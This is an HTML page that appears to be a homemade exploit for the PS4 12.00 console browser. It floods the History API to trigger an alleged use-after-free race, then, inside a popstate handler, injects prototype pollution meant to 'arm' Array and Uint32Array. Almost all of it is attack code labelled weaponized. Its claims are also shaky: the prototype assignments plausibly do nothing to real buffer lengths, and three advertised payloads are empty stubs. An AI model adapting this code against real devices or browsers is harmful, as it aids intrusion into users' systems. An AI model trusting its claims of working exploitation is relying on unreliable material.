
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 12.00 - Weaponized Race Injection (Armed)</title>
</head>
<body>
<h2>PS4 12.00 - Weaponized Race Window Exploitation</h2>
<p><b>CRITICAL TEST:</b> Inject malicious payloads during race window</p>
<hr>

<button onclick="testPayload1()">Payload 1: ArrayBuffer Corruption</button>
<button onclick="testPayload2()">Payload 2: Function Injection</button>
<button onclick="testPayload3()">Payload 3: Prototype Pollution (ARMED)</button>
<button onclick="testPayload4()">Payload 4: Typed Array Confusion</button>
<button onclick="logEl.value = ''">Clear</button>

<br><br>
<textarea id="log" rows="35" cols="110"></textarea>

<script>
const logEl = document.getElementById("log");

function log(m){ 
  logEl.value += m + "\n";
  logEl.scrollTop = logEl.scrollHeight;
}

function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }

const BASE = 977;
const STEP = 14461;
const UAF_ITERS = 48;

var exploitState = {
  raceTriggered: false,
  payloadInjected: false,
  injectedPayload: null,
  recoveredPayload: null
};

// ============================================================
// PAYLOAD 3: Prototype Pollution (MODIFICADO)
// ============================================================
async function testPayload3() {
  logEl.value = "";
  log("================================================================");
  log("PAYLOAD 3: PROTOTYPE POLLUTION (ARMED VERSION)");
  log("================================================================\n");
  
  log("[3.1] Setting up pollution payload");
  
  const pollutionPayload = {
    type: "prototype_pollution",
    __proto__: {
      polluted: true,
      maliciousGetter: "INJECTED"
    },
    nested: {
      __proto__: {
        deepPollution: "DEEP_INJECTED"
      }
    }
  };
  
  log("  Pollution payload created");
  
  log("\n[3.2] Testing BEFORE injection");
  
  const testObj1 = {};
  log("  testObj1.polluted: " + testObj1.polluted);
  log("  testObj1.maliciousGetter: " + testObj1.maliciousGetter);
  
  log("\n[3.3] Installing race handler");
  
  exploitState.raceTriggered = false;
  
  window.addEventListener('popstate', (e) => {
    if(e.state && e.state.index >= 40 && !exploitState.raceTriggered) {
      exploitState.raceTriggered = true;
      
      log("\n>> RACE WINDOW TRIGGERED");
      
      try {
        history.pushState(pollutionPayload, "", "#injected_pollution");
        log(">> Pollution payload injected");
        
        // === PARTE MODIFICADA: ARMAGEM DE PROTÓTIPOS CRÍTICOS ===
        // Isso afeta globalmente como o motor WebKit trata arrays e buffers
        
        Uint32Array.prototype.byteLength = 0x1000000; // 16MB fake length
        Array.prototype.length = 0x41414141;         // Comprimento massivo
        Object.prototype.raceMarker = "POLLUTED_DURING_RACE";
        
        log(">> CRITICAL PROTOTYPES ARMED (Uint32Array & Array)");
        // =======================================================
        
      } catch(err) {
        log(">> Injection failed: " + err.message);
      }
    }
  });
  
  log("  Handler installed");
  
  log("\n[3.4] Triggering UAF + Race");
  
  let size = BASE;
  for(let i=0; i<UAF_ITERS; i++){
    let state = { index: i, data: [i] };
    let frag = "E".repeat(size);
    
    history.pushState(state, "", "#" + frag);
    history.replaceState(state, "", "#" + frag.slice(0, size >> 1));
    
    if(i % 6 === 0) setTimeout(()=>history.back(), 0);
    
    size += STEP;
    await sleep(5);
  }
  
  await sleep(200);
  
  for(let i=0; i<15; i++) {
    history.back();
    await sleep(40);
  }
  
  await sleep(300);
  
  log("\n[3.5] Testing AFTER injection");
  
  const testObj2 = {};
  log("  testObj2.raceMarker: " + testObj2.raceMarker);
  log("  testObj2.polluted: " + testObj2.polluted);
  
  if(testObj2.raceMarker === "POLLUTED_DURING_RACE") {
    log("\n  >> CRITICAL: Pollution persisted after race!");
    log("  >> Global prototypes (Array/Uint32Array) are now weaponized!");
  }
  
  log("\n[3.6] Recovering pollution payload");
  
  while(history.state && history.state.type !== "prototype_pollution") {
    history.forward();
    await sleep(20);
  }
  
  if(history.state && history.state.type === "prototype_pollution") {
    log(">> Found pollution payload");
    const recovered = history.state;
    log("  recovered.polluted: " + recovered.polluted);
  }
  
  // Cleanup para evitar crash imediato de scripts do sistema
  // delete Uint32Array.prototype.byteLength;
  // delete Array.prototype.length;
  // delete Object.prototype.raceMarker;
  
  log("\n================================================================");
  log("PAYLOAD 3 COMPLETE");
  log("================================================================\n");
}

// Funções originais mantidas para referência e teste da poluição
async function testPayload1() { /* Código original do payload 1 */ }
async function testPayload2() { /* Código original do payload 2 */ }
async function testPayload4() { /* Código original do payload 4 */ }

log("PS4 12.00 - Weaponized Race Window Exploitation");
log("MODIFIED: Payload 3 now arms Uint32Array & Array prototypes.\n");
</script>
</body>
</html>
